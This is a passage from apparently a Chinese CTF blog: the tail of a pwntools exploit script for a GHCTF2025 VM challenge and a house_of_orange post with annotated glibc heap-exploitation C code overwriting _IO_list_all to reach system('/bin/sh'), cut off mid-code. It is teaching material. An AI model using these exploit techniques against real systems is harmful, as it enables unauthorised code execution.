class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">code,high,middle,small</span>):</span><br><span class="line">    op = code&lt;&lt;<span class="number">24</span></span><br><span class="line">    op+= high &lt;&lt;<span class="number">16</span></span><br><span class="line">    op+= middle&lt;&lt;<span class="number">8</span></span><br><span class="line">    op+= small</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shell_low=<span class="number">0x0b78</span></span><br><span class="line">shell_high=<span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;IP:&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;SP:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;execve:&#x27;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"><span class="comment">#memory-add= 4*8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10: reg[high]=low</span></span><br><span class="line"><span class="comment"># 0x20: stack[0x642108] = reg[high]</span></span><br><span class="line"><span class="comment"># 0x30: reg[high] = stack[0x642108]</span></span><br><span class="line"><span class="comment"># 0x40: reg[high] = reg[low] + reg[middle]</span></span><br><span class="line"><span class="comment"># 0x50: reg[high] = reg[middle] - reg[low]</span></span><br><span class="line"><span class="comment"># 0x60: reg[high] = reg[low] ^ reg[middle]</span></span><br><span class="line"><span class="comment"># 0x70: reg[high] = reg[middle] &gt;&gt; reg[low]</span></span><br><span class="line"><span class="comment"># 0x80: reg[high] = reg[middle] &lt;&lt; reg[low]</span></span><br><span class="line"><span class="comment"># 0x90: memory[reg[high]] = reg[middle]</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)) <span class="comment">#reg[0]=0x8</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>))  <span class="comment">#reg[1]=8</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>))  <span class="comment">#reg[6]=reg[0]&lt;&lt;reg[1]  =0x800</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>))  <span class="comment">#reg[0]=4</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>))  <span class="comment">#reg[1]=4</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>))  <span class="comment">#reg[7]=0x40=reg[0]&lt;&lt;reg[1]</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">1</span>))  <span class="comment">#reg[7]=0x400</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">1</span>))  <span class="comment">#reg[7]=0x4000</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">1</span>))  <span class="comment">#reg[7]=0x40000</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">1</span>))  <span class="comment">#reg[7]=0x400000</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">7</span>))  <span class="comment">#reg[5]=1</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>))  <span class="comment">#reg[3]=0x70</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">7</span>))  <span class="comment">#reg[1]=7</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>))  <span class="comment">#reg[0]=reg[1]+reg[3]=0x77</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>))   <span class="comment">#reg[8]=reg[0]+reg[6] 0x800+0x77=0x0877</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">7</span>))   <span class="comment">#reg[8]=reg[8]+reg[7] 0x400877---&gt;backdoor</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>))  <span class="comment">#reg[0]=8</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>))  <span class="comment">#reg[1]=0</span></span><br><span class="line">sl(opcode(<span class="number">0x50</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="comment">#reg[2]=-8</span></span><br><span class="line"><span class="comment">#debug</span></span><br><span class="line">sl(opcode(<span class="number">0x90</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>))  <span class="comment">#memory[reg[high]] = reg[middle]</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>持续更新中…</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>本篇博客是复现博客，部分题目思路来自于网上,现在把参考的博客放在下面</p><p>[官方wp](<a href="https://iyheart.github.io/2025/03/09/CTFblog/write">https://iyheart.github.io/2025/03/09/CTFblog/write</a> up系列blog&#x2F;2025年&#x2F;GHCTF2025-PWN方向wp&#x2F;)</p>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house_of_orange</title>
      <link href="/posts/10312.html"/>
      <url>/posts/10312.html</url>
      
        <content type="html"><![CDATA[<h1 id="wiki-源码"><a href="#wiki-源码" class="headerlink" title="wiki 源码"></a>wiki 源码</h1><p>这篇是复现wiki上面的实验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">void</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411242218573.png" alt="image-20241124221822497"></p><p>首先申请了一个堆快，然后把后面的top_chunk的size改变了</p><blockquote><p>注意，这里的top_chunk的大小是有要求的，因为分页机制，所以堆快的大小应该是0x1000类似的</p><p>改变的值只能是0x0fe1、0x1fe1、0x2fe1、0x3fe1这样的</p></blockquote><p>在申请了大于top_chunk的值后，可以达到一个伪free的效果，在没有free函数时</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411242225646.png" alt="image-20241124222559614"></p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>2.24加了保护</p><p>2.27完全失效</p><h1 id="结合io-file后"><a href="#结合io-file后" class="headerlink" title="结合io_file后"></a>结合io_file后</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;p </span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    请注意，上面的内存块将分配在一个不同的页面上，该页面通过mmapped映射。它将被放置在旧堆的末尾之后。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    现在我们剩下的是旧的 Top chunk，它已经被释放并被添加到未排序的链表中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    这里开始攻击的第二阶段。我们假设发生了溢出，覆盖了旧的 top chunk，因此可以覆盖该块的大小。</span></span><br><span class="line"><span class="comment">    对于第二阶段，我们再次利用这个溢出，覆盖这个块在未排序链表中的 fd 和 bk 指针。</span></span><br><span class="line"><span class="comment">    这里有两种常见的方式来利用当前的状态：</span></span><br><span class="line"><span class="comment">      - 通过相应地设置指针来获得 *任意* 位置的分配（至少需要两次分配）</span></span><br><span class="line"><span class="comment">      - 使用链表的 unlink 操作来进行 *位置* 控制写入 libc 的 main_arena 未排序链表（至少需要一次分配）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    前一种攻击相对直接，因此我们这里只详细说明后一种变种，这是由 Angelboy 在其博客中提出的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    这个攻击相当震撼，因为它利用了 abort 调用本身，而这个调用是在 libc 检测到堆的任何错误状态时触发的。</span></span><br><span class="line"><span class="comment">    每当触发 abort 时，它会通过调用 _IO_flush_all_lockp 来刷新所有的文件指针。最终，它会通过 _IO_list_all 遍历链表并调用 _IO_OVERFLOW。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    这个思路是覆盖 _IO_list_all 指针，指向一个伪造的文件指针，这个文件指针的 _IO_OVERFLOW 指向 system，且它的前 8 字节被设置为 &#x27;/bin/sh&#x27;，</span></span><br><span class="line"><span class="comment">    这样调用 _IO_OVERFLOW(fp, EOF) 就会转化为 system(&#x27;/bin/sh&#x27;)。</span></span><br><span class="line"><span class="comment">    更多关于文件指针的利用可以参考这里：</span></span><br><span class="line"><span class="comment">    https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    _IO_list_all 的地址可以通过释放的块的 fd 和 bk 计算得出，因为它们当前指向 libc 的 main_arena。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">  我们计划覆盖旧 top chunk（现在已被添加到 unsorted bins）的 fd 和 bk 指针。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  当 malloc 试图通过拆分这个空闲 chunk 来满足分配请求时，</span></span><br><span class="line"><span class="comment">  chunk-&gt;bk-&gt;fd 处的值会被覆盖为 libc 的 main_arena 中 unsorted-bin-list 的地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  注意，这次覆盖发生在完整性检查之前，因此无论如何都会生效。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  在这里，我们希望 chunk-&gt;bk-&gt;fd 的值是 _IO_list_all，</span></span><br><span class="line"><span class="comment">  因此我们需要将 chunk-&gt;bk 设置为 _IO_list_all - 16。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  函数 _IO_flush_all_lockp 会遍历 _IO_list_all 中的文件指针链表。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  由于我们只能用 main_arena 的 unsorted-bin-list 覆盖这个地址，</span></span><br><span class="line"><span class="comment">  关键点是要控制对应 fd 指针处的内存。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  下一个文件指针的地址位于 base_address+0x68，</span></span><br><span class="line"><span class="comment">  这对应于 smallbin-4，该 bin 存放大小在 90 到 98 之间的 smallbin 块。</span></span><br><span class="line"><span class="comment">  更多关于 libc bin 组织的信息可参考：</span></span><br><span class="line"><span class="comment">  https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  由于我们溢出了旧 top chunk，因此我们也能控制它的 size 字段。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  这里会稍微复杂一点，目前旧 top chunk 位于 unsortedbin 列表中。</span></span><br><span class="line"><span class="comment">  每次 malloc 分配时，都会优先尝试从这个列表中提供 chunk，</span></span><br><span class="line"><span class="comment">  因此 malloc 会遍历 unsortedbin。</span></span><br><span class="line"><span class="comment">  如果某个 chunk 不合适，malloc 会将其分类到相应的 bin 中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果我们将 size 设置为 0x61（97）（prev_inuse 位必须设置），</span></span><br><span class="line"><span class="comment">  并触发一次较小但不匹配的分配，malloc 会将旧 chunk 分类到 smallbin-4。</span></span><br><span class="line"><span class="comment">  由于此 bin 目前为空，旧 top chunk 将成为 new head，</span></span><br><span class="line"><span class="comment">  因此它会占据 main_arena 中 smallbin[4] 的位置，</span></span><br><span class="line"><span class="comment">  最终使其 fd 指针指向伪造的文件指针。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  除了分类之外，malloc 还会对这些 chunk 进行一定的大小检查。</span></span><br><span class="line"><span class="comment">  在分类旧 top chunk 并跟随伪造的 fd 指针到 _IO_list_all 后，</span></span><br><span class="line"><span class="comment">  malloc 会检查相应的 size 字段，</span></span><br><span class="line"><span class="comment">  发现 size 小于 MINSIZE（size ≤ 2 * SIZE_SZ），</span></span><br><span class="line"><span class="comment">  从而触发 abort 调用，引发我们想要的攻击链。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  相关的 libc 代码可参考：</span></span><br><span class="line"><span class="comment">  https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span 